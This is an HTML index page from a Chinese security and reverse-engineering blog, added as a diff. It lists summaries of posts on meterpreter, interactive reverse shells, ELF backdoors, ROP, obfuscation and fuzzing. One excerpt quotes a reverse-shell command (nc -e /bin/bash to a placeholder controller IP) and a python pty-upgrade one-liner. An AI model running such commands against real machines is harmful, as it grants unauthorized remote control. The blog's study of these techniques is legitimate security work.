@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="data:;base64,iVBORw0KGgo=">
+  <title>二进制咸鱼的自我救赎</title>
+  <link rel="stylesheet" href="https://chenx6.github.io/water.min.css">
+  <link rel="stylesheet" type="text/css" href="/syntax-theme-dark.css" media="(prefers-color-scheme: dark)" />
+  <link rel="stylesheet" type="text/css" href="/syntax-theme-light.css" media="(prefers-color-scheme: light)" />
+  
+  <link rel="alternate" type="application/atom+xml" title="RSS" href="https://chenx6.github.io/atom.xml">
+  
+
+  
+  
+</head>
+
+<body>
+  <header>
+    <a href="https:&#x2F;&#x2F;chenx6.github.io&#x2F;"><h1>二进制咸鱼的自我救赎</h1></a>
+    
+    <p class="lead">幸福往往是摸的透彻，而敬业的心却常常隐藏。</p>
+    
+    
+      <a href="https:&#x2F;&#x2F;chenx6.github.io&#x2F;&#x2F;about">
+        About
+      </a>
+    
+    
+    <a href="https://chenx6.github.io/atom.xml">RSS</a>
+    
+  </header>
+  
+  <div class="posts">
+    
+    
+      
+<div class="post">
+  <h2 class="post-title">
+    <a href="https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;meterpreter&#x2F;">
+      meterpreter 简要分析
+    </a>
+  </h1>
+  <span class="post-date">2022-10-23</span>
+  
+  
+
+  
+  <div>
+    
+    meterpreter 是 metasploit 里自带的一款远程控制工具，具有正向&#x2F;反向连接模式，并且功能强大，所以想分析下其实现。
+  </div>
+  
+</div>
+
+    
+      
+<div class="post">
+  <h2 class="post-title">
+    <a href="https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;from-log&#x2F;">
+      从日志函数中回复无符号的函数名字
+    </a>
+  </h1>
+  <span class="post-date">2022-07-24</span>
+  
+  
+
+  
+  <div>
+    
+    在逆向二进制程序中，经常碰到将程序 strip 了，但是日志函数中保留着函数名字的情况。所以写文记录在这种情况下，使用 IDAPython 恢复函数名字的过程。
+  </div>
+  
+</div>
+
+    
+      
+<div class="post">
+  <h2 class="post-title">
+    <a href="https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;calculator&#x2F;">
+      使用编译原理的知识，用 Rust 写一个计算器
+    </a>
+  </h1>
+  <span class="post-date">2022-06-02</span>
+  
+  
+
+  
+  <div>
+    
+    ”想写个计算器“这件事情应该是我刚学会 C 语言时候的事情，当时还看不懂栈，逆波兰式等结构。但是现在不一样了，我不仅学过数据结构，还学过了编译原理。这次我就拿学过的编译原理相关知识写个计算器。
+  </div>
+  
+</div>
+
+    
+      
+<div class="post">
+  <h2 class="post-title">
+    <a href="https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;compile-cheatsheet&#x2F;">
+      关于 C 语言编译的那些破事
+    </a>
+  </h1>
+  <span class="post-date">2022-05-21</span>
+  
+  
+
+  
+  <div>
+    
+    C 和 C++ 的编译是真的痛苦，会出现一堆离谱的问题。所以我特地写一篇文章讲一下这些破事，并且提供一些样例代码方便复制黏贴。
+  </div>
+  
+</div>
+
+    
+      
+<div class="post">
+  <h2 class="post-title">
+    <a href="https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;rev-pty&#x2F;">
+      写一个可交互的反弹 Shell
+    </a>
+  </h1>
+  <span class="post-date">2022-05-02</span>
+  
+  
+
+  
+  <div>
+    
+    在网上能看到一堆的反弹 Shell 方法，最常见的就是先用 &lt;code&gt;nc -e &#x2F;bin&#x2F;bash $控制机IP $控制机端口&lt;&#x2F;code&gt; 弹出一个 Shell，然后再用 &lt;code&gt;python3 -c &#x27;import pty; pty.spawn(&amp;quot;&#x2F;bin&#x2F;bash&amp;quot;)&#x27;&lt;&#x2F;code&gt; 这样来升级成交互式 Shell。这样的话得保证环境里有 nc + python，或者得在被控机上下载多个文件。这样的话，还不如直接自己写一个 Shell 呢 233。
+  </div>
+  
+</div>
+
+    
+      
+<div class="post">
+  <h2 class="post-title">
+    <a href="https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;plthook&#x2F;">
+      plt hook 项目代码分析和最小实现
+    </a>
+  </h1>
+  <span class="post-date">2022-04-05</span>
+  
+  
+
+  
+  <div>
+    
+    虽然知道可以通过魔改 plt 表实现 hook 函数，但是不知道具体实现...碰巧最近用到了 plthook 这个库，于是我就研究了下 plthook 这个库，并且仿照着这个库重新实现一份代码。
+  </div>
+  
+</div>
+
+    
+      
+<div class="post">
+  <h2 class="post-title">
+    <a href="https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;frida-beginner&#x2F;">
+      Frida 在一次离谱比赛中的应用
+    </a>
+  </h1>
+  <span class="post-date">2022-02-26</span>
+  
+  
+
+  
+  <div>
+    
+    在某次离谱比赛中，我使用了 Frida 解出了题目，下面是一些简单的笔记。
+  </div>
+  
+</div>
+
+    
+      
+<div class="post">
+  <h2 class="post-title">
+    <a href="https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;fail-firm-fuzz&#x2F;">
+      记录一次失败的固件 fuzz
+    </a>
+  </h1>
+  <span class="post-date">2021-01-21</span>
+  
+  
+
+  
+  <div>
+    
+    这是我第一次对华硕路由器的 httpd 进行 fuzz。结果 fuzz 出来的结果没有经过实机测试，就提交上去了，然后就是华硕的安全团队复现不出来...为什么复现不出来，在本文总结处进行分析。本文主要讲我在进行固件 fuzz 时的具体过程。
+  </div>
+  
+</div>
+
+    
+      
+<div class="post">
+  <h2 class="post-title">
+    <a href="https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;rewrite-ollvm-fla&#x2F;">
+      重写 OLLVM 之控制流平坦化
+    </a>
+  </h1>
+  <span class="post-date">2021-01-21</span>
+  
+  
+
+  
+  <div>
+    
+    OLLVM 的控制流平坦化是逆向老哥最讨厌的混淆了，因为一旦使用就代表着 IDA 的 decompiler 彻底报废了。所以了解并在&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;chenx6&#x2F;baby_obfuscator&quot;&gt;自己的项目中&lt;&#x2F;a&gt;重写控制流平坦化挺重要的。
+  </div>
+  
+</div>
+
+    
+      
+<div class="post">
+  <h2 class="post-title">
+    <a href="https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;different-rop&#x2F;">
+      不同视角看 ROP
+    </a>
+  </h1>
+  <span class="post-date">2020-06-01</span>
+  
+  
+
+  
+  <div>
+    
+    看了许多讲 ROP 的文章，发现很多只是讲了怎么利用，但是没有讲为什么这么利用。所以写文记录。
+  </div>
+  
+</div>
+
+    
+      
+<div class="post">
+  <h2 class="post-title">
+    <a href="https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;codeql&#x2F;">
+      CodeQL 体验
+    </a>
+  </h1>
+  <span class="post-date">2020-04-20</span>
+  
+  
+
+  
+  <div>
+    
+    &lt;h2 id=&quot;gai-yao&quot;&gt;概要&lt;&#x2F;h2&gt;
+之前在 Twitter 上看到有大佬说 Github Learning Club 上搞了个免费的 CodeQL 课程，课程最终目标是使用 CodeQL 这个语言找出 uboot 中的 9 个漏洞。我在克服拖延症后，终于在 4 月底完成了这个课程，于是写文记录。
+  </div>
+  
+</div>
+
+    
+      
+<div class="post">
+  <h2 class="post-title">
+    <a href="https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;n1-modify&#x2F;">
+      斐讯 N1 折腾&#x2F;避坑笔记
+    </a>
+  </h1>
+  <span class="post-date">2020-02-01</span>
+  
+  
+
+  
+  <div>
+    
+    最近想搞一台小服务器来做 Git 服务器，下载 Bt 等事情，所以就在一堆便宜的 ARM 机顶盒&#x2F;NAS 中间挑选。最后看上了 100 RMB 左右的斐讯 N1，因为 N1 不用拆机就可以刷机。
+  </div>
+  
+</div>
+
+    
+      
+<div class="post">
+  <h2 class="post-title">
+    <a href="https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;lc3-vm&#x2F;">
+      LC3-VM 学习和实现
+    </a>
+  </h1>
+  <span class="post-date">2020-01-15</span>
+  
+  
+
+  
+  <div>
+    
+    本文是根据 &lt;a href=&quot;https:&#x2F;&#x2F;justinmeiners.github.io&#x2F;lc3-vm&quot;&gt;https:&#x2F;&#x2F;justinmeiners.github.io&#x2F;lc3-vm&lt;&#x2F;a&gt; 和 &lt;a href=&quot;https:&#x2F;&#x2F;justinmeiners.github.io&#x2F;lc3-vm&#x2F;supplies&#x2F;lc3-isa.pdf&quot;&gt;https:&#x2F;&#x2F;justinmeiners.github.io&#x2F;lc3-vm&#x2F;supplies&#x2F;lc3-isa.pdf&lt;&#x2F;a&gt; ISA 写出 LC3 VM 的实现过程。
+  </div>
+  
+</div>
+
+    
+      
+<div class="post">
+  <h2 class="post-title">
+    <a href="https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;build-pass-out-of-tree&#x2F;">
+      在 LLVM 代码树外编译 LLVM Pass (使用 OLLVM 示范)
+    </a>
+  </h1>
+  <span class="post-date">2020-01-01</span>
+  
+  
+
+  
+  <div>
+    
+    在网络上流传的编译 LLVM Pass 都需要一份 LLVM 源码，从整个源代码编译，编译非常花时间 (i7 6700HQ 使用 &lt;code&gt;make -j8&lt;&#x2F;code&gt; 编译整个项目花了近 50 分钟)，所以在翻阅文档时发现 LLVM 支持在代码树外编译，在 1 分钟内编译一个 Pass，还是非常香的。
+  </div>
+  
+</div>
+
+    
+      
+<div class="post">
+  <h2 class="post-title">
+    <a href="https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;elf-backdoor&#x2F;">
+      给 ELF 文件加上后门
+    </a>
+  </h1>
+  <span class="post-date">2020-01-01</span>
+  
+  
+
+  
+  <div>
+    
+    在渗透测试中，给常用的可执行文件加上后门是很常见的操作。但是之前的加后门 &amp;quot;The backdoor factory&amp;quot; 已经不维护了，而且还是 Python2 写的，代码质量也...所以我自己尝试着重新用 Python3 造了个轮子。在造轮子的过程中，由于 APUE 扔在学校里面了，导致在写和系统相关的汇编时出现了一些翻车情况...
+  </div>
+  
+</div>
+
+    
+      
+<div class="post">
+  <h2 class="post-title">
+    <a href="https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;obfuscate-string&#x2F;">
+      使用 LLVM Pass 实现字符串加密
+    </a>
+  </h1>
+  <span class="post-date">2020-01-01</span>
+  
+  
+
+  
+  <div>
+    
+    这个项目可以作为我看了这么久 LLVM 的 Docs 助眠的一个小总结吧。这个项目主要就是给函数使用的常量字符串进行加密，在程序被静态分析的时候干扰分析。当然找到思路后，这个混淆还是很容易解开的。
+  </div>
+  
+</div>
+
+    
+      
+<div class="post">
+  <h2 class="post-title">
+    <a href="https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;rewrite-ollvm-bcf&#x2F;">
+      重写 OLLVM 之虚假控制流
+    </a>
+  </h1>
+  <span class="post-date">2020-01-01</span>
+  
+  
+
+  
+  <div>
+    
+    由于我个人觉得 OLLVM 的代码年久失修，所以就新建了个项目，开始学习并重写 OLLVM。项目地址：&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;chenx6&#x2F;baby_obfuscator&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;chenx6&#x2F;baby_obfuscator&lt;&#x2F;a&gt;。如果将我的重写项目和 OLLVM 相比的话，我的项目的优点就是编译比较快（编译整个项目只需要不到 1 分钟），代码比较“新”吧...
+  </div>
+  
+</div>
+
+    
+  </div>
+  <nav class="pagination">
+    
+    
+  </nav>
+
+</body>
+
+</html>
